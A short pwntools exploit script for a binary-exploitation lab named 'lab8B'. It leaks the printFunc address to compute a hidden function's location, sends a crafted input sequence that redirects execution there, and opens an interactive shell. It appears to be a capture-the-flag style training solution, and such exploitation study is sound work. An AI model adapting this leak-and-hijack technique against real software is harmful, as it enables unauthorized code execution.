from pwn import *

p = process("./lab8B")
gdb_cmds = [
    "continue\n"
]

def leak_secret():

    p.sendline("3")
    p.sendline("1")

    p.recvuntil("void printFunc: ")
    printFunc = int(p.recvline()[2:],16)

    secret = printFunc - 0x42
    
    return secret


#gdb.attach(p, ''.join(gdb_cmds))
p.sendline("1")
p.sendline("1")

for i in range(0, 9): p.sendline("1")
secret = leak_secret()
log.success("Secret at: " + hex(secret))

p.sendline("1")
p.sendline("2")

p.sendline("A")
p.sendline("1")
p.sendline("2")
p.sendline("3")
p.sendline(str(secret - 1))
p.sendline("6")
p.sendline("6")
p.sendline("7")
p.sendline("8")

p.sendline("2")
for i in range(0,5): p.sendline("4")

p.sendline("6")
p.sendline("4")
p.sendline("1")
p.sendline("3")
p.sendline("1")
p.interactive()

